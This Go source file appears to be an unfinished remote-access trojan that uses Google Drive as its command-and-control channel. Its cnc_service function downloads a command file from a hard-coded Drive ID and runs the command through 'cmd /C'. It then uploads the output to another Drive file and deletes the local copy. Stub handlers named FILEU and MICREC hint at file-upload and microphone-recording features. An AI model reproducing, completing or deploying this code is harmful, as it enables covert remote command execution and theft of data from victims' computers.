package main

import (
  "encoding/json"
  "fmt"
  "io"
  "io/ioutil"
  "log"
  "net/http"
  "net/url"
  "os"
  "os/user"
  "path/filepath"
  "strings"
  "time"
  "runtime"
  "os/exec"
  "golang.org/x/net/context"
  "golang.org/x/oauth2"
  "golang.org/x/oauth2/google"
  "google.golang.org/api/drive/v2"
)

func check(e error) {
    if e != nil {
        panic(e)
    }
}

func getClient(ctx context.Context, config *oauth2.Config) *http.Client {
  cacheFile, err := tokenCacheFile()
  if err != nil {
    log.Fatalf("Unable to get path to cached credential file. %v", err)
  }
  tok, err := tokenFromFile(cacheFile)
  if err != nil {
    tok = getTokenFromWeb(config)
    saveToken(cacheFile, tok)
  }
  return config.Client(ctx, tok)
}

// getTokenFromWeb uses Config to request a Token.
// It returns the retrieved Token.
func getTokenFromWeb(config *oauth2.Config) *oauth2.Token {
  authURL := config.AuthCodeURL("state-token", oauth2.AccessTypeOffline)
  fmt.Printf("Go to the following link in your browser then type the "+
    "authorization code: \n%v\n", authURL)

  var code string
  if _, err := fmt.Scan(&code); err != nil {
    log.Fatalf("Unable to read authorization code %v", err)
  }

  tok, err := config.Exchange(oauth2.NoContext, code)
  if err != nil {
    log.Fatalf("Unable to retrieve token from web %v", err)
  }
  return tok
}

// tokenCacheFile generates credential file path/filename.
// It returns the generated credential path/filename.
func tokenCacheFile() (string, error) {
  usr, err := user.Current()
  if err != nil {
    return "", err
  }
  tokenCacheDir := filepath.Join(usr.HomeDir, ".credentials")
  os.MkdirAll(tokenCacheDir, 0700)
  return filepath.Join(tokenCacheDir,
    url.QueryEscape("drive-api-quickstart.json")), err
}

// tokenFromFile retrieves a Token from a given file path.
// It returns the retrieved Token and any read error encountered.
func tokenFromFile(file string) (*oauth2.Token, error) {
  f, err := os.Open(file)
  if err != nil {
    return nil, err
  }
  t := &oauth2.Token{}
  err = json.NewDecoder(f).Decode(t)
  defer f.Close()
  return t, err
}

// saveToken uses a file path to create a file and store the
// token in it.
func saveToken(file string, token *oauth2.Token) {
  fmt.Printf("Saving credential file to: %s\n", file)
  f, err := os.Create(file)
  if err != nil {
    log.Fatalf("Unable to cache oauth token: %v", err)
  }
  defer f.Close()
  json.NewEncoder(f).Encode(token)
}



func UpdateFile(title string){

	//https://drive.google.com/open?id=0B0XyyZgIHsZldE1IZkUza2Z1MVU
	fileId := "0B0XyyZgIHsZldE1IZkUza2Z1MVU"
	 ctx := context.Background()
 
  b, err := ioutil.ReadFile("client_secret.json")
  if err != nil {
    log.Fatalf("Unable to read client secret file: %v", err)
  }

  config, err := google.ConfigFromJSON(b, drive.DriveScope)
  if err != nil {
    log.Fatalf("Unable to parse client secret file to config: %v", err)
  }
  client := getClient(ctx, config)
  svn, err := drive.New(client)
  fmt.Printf("Svn type is %T\n",svn)
  if err != nil {
    log.Fatalf("Unable to retrieve drive Client %v", err)
  }
  
  f, err := svn.Files.Get(fileId).Do()
  if err != nil {
    fmt.Printf("An error occurred: %v\n", err)
  
  }
  f.Title = title
  
  m, err := os.Open(title)
  if err != nil {
    fmt.Printf("An error occurred: %v\n", err)
   
  }
  r, err := svn.Files.Update(fileId, f).Media(m).Do()
  if err != nil {
    fmt.Printf("An error occurred: %v\n%s", err,r)
  
  }
 defer m.Close(); 
}
 func uploadfile(filename string){
 	 ctx := context.Background()

  b, err := ioutil.ReadFile("client_secret.json")
  if err != nil {
    log.Fatalf("Unable to read client secret file: %v", err)
  }

  config, err := google.ConfigFromJSON(b, drive.DriveScope)
  if err != nil {
    log.Fatalf("Unable to parse client secret file to config: %v", err)
  }
  client := getClient(ctx, config)
  svn, err := drive.New(client)
  fmt.Printf("Svn type is %T\n",svn)
  if err != nil {
    log.Fatalf("Unable to retrieve drive Client %v", err)
  }
   m, err := os.Open(filename)
  if err != nil {
    fmt.Printf("An error occurred: %v\n", err)
    
  }
  //f := &drive.File{Title: filename}
  fmt.Printf("\nHi\n")
  r, err := svn.Files.Insert(&drive.File{Title: filename}).Media(m).Do()
  if err != nil {
    fmt.Printf("An error occurred: %v\n", err)
      }
       defer m.Close()
  fmt.Printf("\nBye\n %T",r)

  
 }


func downloadfile(fileid string , fileName string) {
    //https://drive.google.com/open?id=0B0XyyZgIHsZlVUE5cmxTTTBFbzA
    //https://drive.google.com/open?id=0B0XyyZgIHsZlVUE5cmxTTTBFbzA
    //https://drive.google.com/open?id=0B0XyyZgIHsZlYk8zTXNjbGJ4akk
    url := "https://googledrive.com/host/"
    url += fileid
    
    fmt.Println("Downloading file... %v",fileName)

    output, err := os.Create(fileName)
    defer output.Close()

    response, err := http.Get(url)
    if err != nil {
        fmt.Println("Error while downloading", url, "-", err)
        return
    }
    defer response.Body.Close()

    n, err := io.Copy(output, response.Body)

    fmt.Println(n, "bytes downloaded")
}

func cnc_service(){
		 id := "0B0XyyZgIHsZlYk8zTXNjbGJ4akk"
    idfile := "cmd.txt"
    //cmdfile := "res.txt" 
     downloadfile(id,idfile)
	
    i_string,errr  := ioutil.ReadFile("cmd.txt")
    if errr !=nil {
    	fmt.Println("canot open cmd.txt")
    }
    inputstring := string(i_string)
    fmt.Println("cmd file read and string is %s", inputstring)
	newdata := strings.Split(inputstring,",")

	for i := range newdata {
	fmt.Println(newdata[i])
    }

    if newdata[0] == "CMDL" {
	
		var check string =" 1> res.txt"
		
		//data2 = append(data2,"1> out.txt")
		newdata[1] += check
		fmt.Printf("INSIDE CMDL %s\n",newdata[1])
		c := exec.Command("cmd", "/C", newdata[1])
		if err := c.Run(); err != nil { 
				fmt.Println("Error: ", err)
		 } 
		
		
		//upload here
		 UpdateFile("res.txt")
		
		time.Sleep(3 * time.Second)
		
		 err := os.Remove("res.txt")

      if err != nil {
          fmt.Println(err)
          return
      }
	
	
	}
	
	
	if newdata[0] == "FILEU" {
	
	
	
	
	}
	
	if newdata[0] == "FILEB" {
			caseFileB(newdata[1])
	
	
	
	}
	
	
	if newdata[0] == "MICREC" {
	
	
	
	
	}
	
	
}



func caseFileB(data2 string){

		
		if runtime.GOOS == "windows" {
			var check string = " > res.txt "
			fmt.Printf("%s\n",check)
			data2 += check
			fmt.Printf("CASEFILEB%s\n",data2)
			
			
			
			
			c := exec.Command("cmd", "/C", data2)
			if err := c.Run(); err != nil { 
				fmt.Println("Error: ", err)
			} 
		  fmt.Println("Uploading FileB ")
			//UPLOAD FILE HERE
			//uploadfile("fileb.txt")
			//UpdateFile("res.txt")
			
			time.Sleep(2 * time.Second)
			//deleting 
			fmt.Println("Removing file from disk")
			err := os.Remove("fileb.txt")

			if err != nil {
			fmt.Println(err)
			return
			}

				
				
			resFile, err :=os.Create("resf.txt")

			if err==nil{

				fmt.Println("\nRes file created successfully.\n")
			}
		

			//CURL HERE

			resFile.Close()

			
			//will be used later
			/*
			resFile1, err :=ioutil.ReadFile("resf.txt")
			if err==nil{

				fmt.Println("\nRes file created successfully.\n")
			}
			*/
			var resN string ="1abc"
			//var resN string ="0abc"
			if resN[0] =='1'{

					fmt.Println("\ninside resN\n")

			}

			if resN[0] =='0'{

					fmt.Println("\ninside resN0000\n")

					return

			}

			fmt.Println("\nOUTSIDE resN0000\n")

			/*err := os.Remove("resf.txt")

			if err != nil {
			fmt.Println(err)
			return
			}
			*/
		}
			 
			var a1 string ="google"
			var a2 string ="facebook"
			a1+=a2
			fmt.Print("\nJOINED STRING %s\n",a1)

}


func main() {

	cnc_service()
}